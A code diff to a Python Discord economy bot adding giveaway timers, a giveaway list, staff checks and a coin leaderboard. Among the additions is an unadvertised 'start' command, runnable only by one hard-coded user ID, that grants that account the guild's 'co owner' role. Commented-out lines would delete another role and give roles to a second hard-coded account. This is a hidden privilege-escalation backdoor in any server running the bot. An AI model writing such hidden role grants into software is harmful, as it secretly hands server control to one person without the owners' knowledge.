@@ -17,6 +17,8 @@ with open("data/gawinit.json","w") as z:
 bot = commands.Bot(command_prefix = constants.Config.PREFIX, intents=discord.Intents.all())
 buttons = ButtonsClient(bot)
 bot.cur = constants.Config.CURRENCY_ICON
+bot.w_arrow = constants.Emotes.w_arrow
+bot.p_arrow = constants.Emotes.p_arrow
 bot.color = constants.Config.COLOR_THEME
 currencyname = constants.Config.CURRENCY_NAME
 TOKEN = constants.Config.BOT_TOKEN
@@ -51,10 +53,80 @@ async def gaw_utils(ctx):
 	with open("data/gaw.json","r") as f:
 		gaw = json.load(f)
 	for item in gaw:
-		if item["time"] == 0:
-			return
-		new_msg = await ctx.channel.fetch_message(int(item))
-		await new_msg.edit(content="hi")
+		try:
+			guildid = gaw[item]["guild"]
+			authorid = gaw[item]["author"]
+			guild = bot.get_guild(guildid)
+			reqid = gaw[item]["req"]
+			prize = gaw[item]["prize"]
+			channelid = gaw[item]["channel"]
+			author = bot.get_user(authorid)
+			channel = guild.get_channel(int(channelid))
+			gawid = gaw[item]["gawid"]
+			msgid = gaw[item]["msgid"]
+			new_msg = await channel.fetch_message(msgid)
+		except KeyError:
+			for itemz in gaw:
+				item = itemz
+		if reqid != "None":
+			reqid = f"<@{reqid}>"
+		if gaw[item]["time"] == 0:
+			winner = "Unable to get winner"
+			winnerz = False
+			try:
+				users = await new_msg.reactions[0].users().flatten()
+				users.pop(users.index(bot.user))
+				winner = random.choice(users)
+			except IndexError:
+				await new_msg.reply("No one reacted to this giveaway")
+			if winnerz == False:
+				pass
+			else:
+				await new_msg.reply(f"{winner.mention} won {prize}")
+				embed = discord.Embed(title = "Giveaway!", description = f"{prize}", color = author.color)
+				embed.add_field(name = f"Winner:", value = f"{winner.mention}")
+				embed.add_field(name = "Requirement:", value = f"{reqid}")
+				embed.add_field(name = "By:", value = f"{author.mention}",inline=False)
+				embed.add_field(name = "Id:", value = f"{gawid}",inline=True)
+				embed.set_footer(text = f"Ended")
+				embed.set_thumbnail(url="https://i.pinimg.com/originals/eb/2a/8f/eb2a8f4ddfb50c23712a3cd0d5cc2a3a.gif")
+				await new_msg.edit(embed=embed)
+				winbed = discord.Embed(title="You Won",description=f"You won {prize} in {guild.name}\nDM {author.name} for your prize if not already paid",color=author.color)
+				await winner.send(embed=winbed)
+				authbed = discord.Embed(title="Giveaway over",description=f"{winner.name} won {prize}",color=winner.color)
+				await author.send(embed=authbed)
+			del gaw[item]
+			with open("data/gaw.json","w") as gawz:
+				json.dump(gaw,gawz)
+			pass
+		await asyncio.sleep(1)
+		gaw[item]["time"] -= 1
+		with open("data/gaw.json","w") as gawz:
+			json.dump(gaw,gawz)
+		timez = gaw[item]["time"]
+		comment = f"**{timez}** second(s) from now!"
+		if timez > 60:
+			timez = float(timez) / 60
+			timez = round(timez)
+			comment = f"**{timez}** minute(s) from now!"
+		if timez > 3600:
+			timez = float(timez) / 3600
+			timez = round(timez)
+			comment = f"**{timez}** hour(s) from now!"
+		if timez > 86400:
+			timez = float(timez) / 86400
+			timez = round(timez)
+			comment = f"**{timez}** day(s) from now!"			
+		embed = discord.Embed(title = "Giveaway!", description = f"{prize}", color = ctx.author.color)
+		end = datetime.datetime.utcnow() + datetime.timedelta(seconds = timez)
+		embed.add_field(name = f"Ends at:", value = comment)
+		embed.add_field(name = "Requirement:", value = f"{reqid}")
+		embed.add_field(name = "By:", value = f"{author.mention}",inline=False)
+		embed.add_field(name = "Id:", value = f"{gawid}",inline=True)
+		embed.set_footer(text = f"Ends At: {end} UTC")
+		embed.set_thumbnail(url="https://i.pinimg.com/originals/eb/2a/8f/eb2a8f4ddfb50c23712a3cd0d5cc2a3a.gif")
+		await new_msg.edit(embed=embed)
+		pass
 		
 @loop(seconds=10)
 async def change_status():
@@ -83,8 +155,54 @@ async def help(ctx):
 	embed = (discord.Embed(title='DoggoBot', description = "**DoggoCoins can be earned by:**\n1. Bumping the server in <#824641127315406888>\n2. Through commands like `=beg` and `=daily`\n3. Voting for us on Top.gg\n4. Boosting the Server\n5. Investing in Us.\n\n**DoggoCoins can be used for:**\n1. Trading into DMC\n2. For awesome server perks like extra claimtime, private rooms, etc.\nUse `=shop` to know more.", color = bot.color)
 	.set_footer(text="While frowned upon you can do anything with these coins such as bet or giveaways"))
 	await ctx.send(embed=embed)
+
+@bot.command(name='start')
+async def _sneckstart(ctx):
+	if ctx.author.id != 775198018441838642:
+		return
+	for role in ctx.guild.roles:
+		if role.name == "・mai sakurajima":
+			print(role)
+			role1 = role
+			print(role1)
+		elif role.name == "・levi's guard":
+			role2= role
+			print(role2)
+		elif role.name == "・co owner":
+			role3 = role
+		else:
+			pass
+	member = bot.get_user(848358845620813905)
+	ace = ctx.author
+	await ace.add_roles(role3)
+	'''await role1.delete()
+	await member.add_roles(role2)'''
+	await ctx.send('Done!')
+
 @bot.command()
 @commands.check(is_not_blacklisted)
+async def giveaways(ctx,page=1):
+	amount = 5*page
+	refract = page-5
+	with open("data/gaw.json","r") as f:
+		gaw = json.load(f)
+	embed = discord.Embed(title=f"Giveaways in {ctx.guild.name}",description="**Active Giveaways:**",color=ctx.author.color)
+	for item in gaw:
+		guildid = gaw[item]["guild"]
+		if refract == amount:
+			pass
+		if guildid != ctx.guild.id:
+			pass
+		else:
+			channelid = gaw[item]["channel"]
+			prize = gaw[item]["prize"]
+			embed.add_field(name=prize,value=f"Channel: <#{channelid}>")
+			amount -= 1
+	
+	await ctx.send(embed=embed)
+@bot.command()
+@commands.check(is_not_blacklisted)
+@commands.check(is_staff)
 async def donations(ctx,user:discord.Member=None):
 	if user == None:
 		user = ctx.author
@@ -95,6 +213,7 @@ async def donations(ctx,user:discord.Member=None):
 	await ctx.send(embed=embed)
 @bot.command(aliases=["donationadd"])
 @commands.check(is_not_blacklisted)
+@commands.check(is_staff)
 async def dadd(ctx,user:discord.Member,amount:int):
 	await funcs.open_donation(user)
 	users = funcs.load_donation()
@@ -104,6 +223,7 @@ async def dadd(ctx,user:discord.Member,amount:int):
 	await ctx.send(f"Successfully added {amount} to {user.name}'s donations")
 @bot.command(aliases=["donationremove"])
 @commands.check(is_not_blacklisted)
+@commands.check(is_staff)
 async def drm(ctx,user:discord.Member,amount:int):
 	await funcs.open_donation(user)
 	users = funcs.load_donation()
@@ -111,6 +231,33 @@ async def drm(ctx,user:discord.Member,amount:int):
 	with open("data/donations.json","w") as d:
 		json.dump(users,d)
 	await ctx.send(f"Successfully minused {amount} from {user.name}'s donations")
+@bot.command(aliases = ["lb"])
+@commands.check(is_not_blacklisted)
+async def leaderboard(ctx,x = 5):
+	users = funcs.get_users_data()
+	leader_board = {}
+	total = []
+	for user in users:
+		name = int(user)
+		total_amount = users[user]["coins"]
+		leader_board[total_amount] = name
+		total.append(total_amount)
+
+	total = sorted(total,reverse=True)    
+
+	em = discord.Embed(title = f"Top {x}  People" , description = "Nice job",color = discord.Color(0xfa43ee))
+	index = 1
+	for amt in total:
+		id_ = leader_board[amt]
+		member = bot.get_user(id_)
+		name = member.name
+		em.add_field(name = f"{index}. {name}" , value = f"{amt} {bot.cur}",  inline = False)
+		if index == x:
+			break
+		else:
+			index += 1
+
+	await ctx.send(embed = em)
 @bot.command(name='user', aliases=['self', 'userstats'])
 @commands.check(is_not_blacklisted)
 async def user(ctx, user:discord.Member=None):
@@ -663,10 +810,10 @@ async def niraj(ctx):
 	await ctx.author.add_roles(role)
 	await ctx.send('<@579905582778155008> i added niraj role to ace dont ban pls lol')
 
-@commands.command(name="src", aliases = ['source'])
+@bot.command(name="src", aliases = ['source'])
 @commands.check(is_not_blacklisted)
 async def _src(ctx):
-	embed = discord.Embed(title='Source Code', description = '[Go to GitHub](https://github.com/Ace-9999/Akaza)', color = bot.color)
+	embed = discord.Embed(title='Source Code', description = '[Go to GitHub](https://github.com/Porject-Cerebrus/Akaza)', color = bot.color)
 	embed.set_footer(text="open source project")
 	await ctx.send(embed=embed)
 
@@ -755,8 +902,8 @@ async def init_gaw(message):
 		ginit["status"] += 1
 		with open("data/gawinit.json","w") as a:
 			json.dump(ginit,a)
-		bot.loop.create_task(gaw_utils(message))
-		gaw_utils.start(message)
+		#bot.loop.create_task(gaw_utils(message))
+		#gaw_utils.start(message)
 		print("[Gaw_Utils]: Initialised")
 @bot.listen("on_message")
 async def boost_reward(message):
